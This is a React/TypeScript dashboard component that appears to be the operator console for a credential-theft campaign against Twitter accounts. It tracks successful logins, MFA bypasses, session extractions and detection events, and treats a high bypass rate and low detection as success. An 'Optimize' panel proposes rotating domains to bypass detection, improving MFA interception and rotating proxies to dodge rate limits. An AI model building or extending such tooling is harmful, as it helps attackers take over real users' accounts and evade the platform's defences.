import React, { useState, useEffect } from 'react';
import { Card, Row, Col, Statistic, Alert, Progress, Button, Table, Tag, Timeline, Modal } from 'antd';
import { 
  TwitterOutlined, 
  WarningOutlined, 
  CheckCircleOutlined, 
  ExclamationCircleOutlined,
  ReloadOutlined,
  SettingOutlined,
  BarChartOutlined
} from '@ant-design/icons';
import { LineChart, Line, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer, PieChart, Pie, Cell } from 'recharts';
import axios from 'axios';

interface TwitterMetrics {
  campaign_id: string;
  timestamp: string;
  total_attempts: number;
  successful_logins: number;
  mfa_challenges: number;
  mfa_bypasses: number;
  session_extractions: number;
  rate_limit_hits: number;
  detection_events: number;
  error_count: number;
  avg_response_time: number;
}

interface TwitterAlert {
  alert_id: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  category: 'detection' | 'mfa' | 'rate_limit' | 'technical';
  message: string;
  timestamp: string;
  recommended_action: string;
}

const TwitterDashboard: React.FC = () => {
  const [metrics, setMetrics] = useState<TwitterMetrics | null>(null);
  const [alerts, setAlerts] = useState<TwitterAlert[]>([]);
  const [loading, setLoading] = useState(true);
  const [healthStatus, setHealthStatus] = useState<string>('unknown');
  const [showOptimizationModal, setShowOptimizationModal] = useState(false);

  const COLORS = {
    critical: '#ff4d4f',
    high: '#ff7a45',
    medium: '#ffa940',
    low: '#52c41a'
  };

  useEffect(() => {
    fetchTwitterData();
    const interval = setInterval(fetchTwitterData, 30000); // Update every 30 seconds
    return () => clearInterval(interval);
  }, []);

  const fetchTwitterData = async () => {
    try {
      setLoading(true);
      const [metricsResponse, alertsResponse] = await Promise.all([
        axios.get('/api/twitter/metrics'),
        axios.get('/api/twitter/alerts')
      ]);

      setMetrics(metricsResponse.data);
      setAlerts(alertsResponse.data);
      
      // Calculate health status
      const successRate = metricsResponse.data?.successful_logins / metricsResponse.data?.total_attempts || 0;
      if (successRate > 0.1) setHealthStatus('excellent');
      else if (successRate > 0.05) setHealthStatus('good');
      else if (successRate > 0.02) setHealthStatus('fair');
      else setHealthStatus('poor');
    } catch (error) {
      console.error('Error fetching Twitter data:', error);
    } finally {
      setLoading(false);
    }
  };

  const getSeverityColor = (severity: string) => {
    return COLORS[severity as keyof typeof COLORS] || '#d9d9d9';
  };

  const getHealthColor = (status: string) => {
    switch (status) {
      case 'excellent': return '#52c41a';
      case 'good': return '#1890ff';
      case 'fair': return '#faad14';
      case 'poor': return '#ff4d4f';
      default: return '#d9d9d9';
    }
  };

  const calculateRates = () => {
    if (!metrics) return {};
    
    return {
      successRate: metrics.total_attempts > 0 ? (metrics.successful_logins / metrics.total_attempts * 100) : 0,
      mfaBypassRate: metrics.mfa_challenges > 0 ? (metrics.mfa_bypasses / metrics.mfa_challenges * 100) : 0,
      sessionExtractionRate: metrics.successful_logins > 0 ? (metrics.session_extractions / metrics.successful_logins * 100) : 0,
      detectionRate: metrics.total_attempts > 0 ? (metrics.detection_events / metrics.total_attempts * 100) : 0,
      rateLimitRate: metrics.total_attempts > 0 ? (metrics.rate_limit_hits / metrics.total_attempts * 100) : 0
    };
  };

  const rates = calculateRates();

  const alertColumns = [
    {
      title: 'Severity',
      dataIndex: 'severity',
      key: 'severity',
      render: (severity: string) => (
        <Tag color={getSeverityColor(severity)}>
          {severity.toUpperCase()}
        </Tag>
      )
    },
    {
      title: 'Category',
      dataIndex: 'category',
      key: 'category',
      render: (category: string) => (
        <Tag>{category.replace('_', ' ').toUpperCase()}</Tag>
      )
    },
    {
      title: 'Message',
      dataIndex: 'message',
      key: 'message'
    },
    {
      title: 'Time',
      dataIndex: 'timestamp',
      key: 'timestamp',
      render: (timestamp: string) => new Date(timestamp).toLocaleTimeString()
    }
  ];

  const pieData = [
    { name: 'Successful', value: metrics?.successful_logins || 0 },
    { name: 'MFA Failed', value: (metrics?.mfa_challenges || 0) - (metrics?.mfa_bypasses || 0) },
    { name: 'Rate Limited', value: metrics?.rate_limit_hits || 0 },
    { name: 'Detected', value: metrics?.detection_events || 0 },
    { name: 'Errors', value: metrics?.error_count || 0 }
  ];

  const criticalAlerts = alerts.filter(alert => alert.severity === 'critical' || alert.severity === 'high');

  return (
    <div className="twitter-dashboard">
      {/* Header */}
      <div style={{ marginBottom: 24 }}>
        <Row justify="space-between" align="middle">
          <Col>
            <h1><TwitterOutlined /> Twitter Campaign Dashboard</h1>
          </Col>
          <Col>
            <Button 
              icon={<ReloadOutlined />} 
              onClick={fetchTwitterData}
              loading={loading}
            >
              Refresh
            </Button>
            <Button 
              icon={<SettingOutlined />} 
              onClick={() => setShowOptimizationModal(true)}
              style={{ marginLeft: 8 }}
            >
              Optimize
            </Button>
          </Col>
        </Row>
      </div>

      {/* Critical Alerts */}
      {criticalAlerts.length > 0 && (
        <Row gutter={[16, 16]} style={{ marginBottom: 24 }}>
          <Col span={24}>
            <Alert
              message="Critical Alerts Detected"
              description={
                <div>
                  {criticalAlerts.slice(0, 3).map(alert => (
                    <div key={alert.alert_id} style={{ marginBottom: 8 }}>
                      <strong>{alert.category}:</strong> {alert.message}
                    </div>
                  ))}
                  {criticalAlerts.length > 3 && (
                    <div>... and {criticalAlerts.length - 3} more alerts</div>
                  )}
                </div>
              }
              type="error"
              showIcon
              action={
                <Button size="small" danger>
                  View All
                </Button>
              }
            />
          </Col>
        </Row>
      )}

      {/* Key Metrics */}
      <Row gutter={[16, 16]} style={{ marginBottom: 24 }}>
        <Col xs={24} sm={12} md={6}>
          <Card>
            <Statistic
              title="Overall Health"
              value={healthStatus.toUpperCase()}
              valueStyle={{ color: getHealthColor(healthStatus) }}
              prefix={<BarChartOutlined />}
            />
          </Card>
        </Col>
        <Col xs={24} sm={12} md={6}>
          <Card>
            <Statistic
              title="Success Rate"
              value={rates.successRate}
              precision={1}
              suffix="%"
              valueStyle={{ color: rates.successRate > 5 ? '#3f8600' : '#cf1322' }}
              prefix={<CheckCircleOutlined />}
            />
          </Card>
        </Col>
        <Col xs={24} sm={12} md={6}>
          <Card>
            <Statistic
              title="MFA Bypass Rate"
              value={rates.mfaBypassRate}
              precision={1}
              suffix="%"
              valueStyle={{ color: rates.mfaBypassRate > 30 ? '#3f8600' : '#cf1322' }}
              prefix={<ExclamationCircleOutlined />}
            />
          </Card>
        </Col>
        <Col xs={24} sm={12} md={6}>
          <Card>
            <Statistic
              title="Detection Rate"
              value={rates.detectionRate}
              precision={1}
              suffix="%"
              valueStyle={{ color: rates.detectionRate < 5 ? '#3f8600' : '#cf1322' }}
              prefix={<WarningOutlined />}
            />
          </Card>
        </Col>
      </Row>

      {/* Charts and Details */}
      <Row gutter={[16, 16]}>
        <Col xs={24} lg={12}>
          <Card title="Campaign Performance" size="small">
            <ResponsiveContainer width="100%" height={300}>
              <PieChart>
                <Pie
                  data={pieData}
                  cx="50%"
                  cy="50%"
                  labelLine={false}
                  label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`}
                  outerRadius={80}
                  fill="#8884d8"
                  dataKey="value"
                >
                  {pieData.map((entry, index) => (
                    <Cell key={`cell-${index}`} fill={['#52c41a', '#ff7a45', '#faad14', '#ff4d4f', '#d9d9d9'][index]} />
                  ))}
                </Pie>
                <Tooltip />
              </PieChart>
            </ResponsiveContainer>
          </Card>
        </Col>
        
        <Col xs={24} lg={12}>
          <Card title="Rate Analysis" size="small">
            <div style={{ marginBottom: 16 }}>
              <div style={{ marginBottom: 8 }}>
                <span>Success Rate</span>
                <Progress percent={rates.successRate} strokeColor="#52c41a" />
              </div>
              <div style={{ marginBottom: 8 }}>
                <span>MFA Bypass Rate</span>
                <Progress percent={rates.mfaBypassRate} strokeColor="#1890ff" />
              </div>
              <div style={{ marginBottom: 8 }}>
                <span>Session Extraction Rate</span>
                <Progress percent={rates.sessionExtractionRate} strokeColor="#722ed1" />
              </div>
              <div style={{ marginBottom: 8 }}>
                <span>Detection Rate</span>
                <Progress percent={rates.detectionRate} strokeColor="#ff4d4f" />
              </div>
              <div>
                <span>Rate Limit Hit Rate</span>
                <Progress percent={rates.rateLimitRate} strokeColor="#faad14" />
              </div>
            </div>
          </Card>
        </Col>
      </Row>

      {/* Recent Alerts */}
      <Row gutter={[16, 16]} style={{ marginTop: 24 }}>
        <Col span={24}>
          <Card title="Recent Alerts" size="small">
            <Table
              columns={alertColumns}
              dataSource={alerts}
              rowKey="alert_id"
              pagination={{ pageSize: 5 }}
              size="small"
            />
          </Card>
        </Col>
      </Row>

      {/* Optimization Modal */}
      <Modal
        title="Twitter Campaign Optimization"
        visible={showOptimizationModal}
        onCancel={() => setShowOptimizationModal(false)}
        footer={[
          <Button key="cancel" onClick={() => setShowOptimizationModal(false)}>
            Cancel
          </Button>,
          <Button key="optimize" type="primary" onClick={() => {
            // Handle optimization
            setShowOptimizationModal(false);
          }}>
            Apply Optimizations
          </Button>
        ]}
      >
        <Timeline>
          <Timeline.Item color="blue">
            <p><strong>Domain Rotation</strong></p>
            <p>Generate new domain variations to bypass detection</p>
          </Timeline.Item>
          <Timeline.Item color="green">
            <p><strong>MFA Bypass Enhancement</strong></p>
            <p>Update MFA interception techniques for better success rates</p>
          </Timeline.Item>
          <Timeline.Item color="orange">
            <p><strong>Rate Limiting Optimization</strong></p>
            <p>Adjust request timing and implement proxy rotation</p>
          </Timeline.Item>
          <Timeline.Item color="red">
            <p><strong>Endpoint Update</strong></p>
            <p>Update Twitter API endpoints to match current version</p>
          </Timeline.Item>
        </Timeline>
      </Modal>
    </div>
  );
};

export default TwitterDashboard;
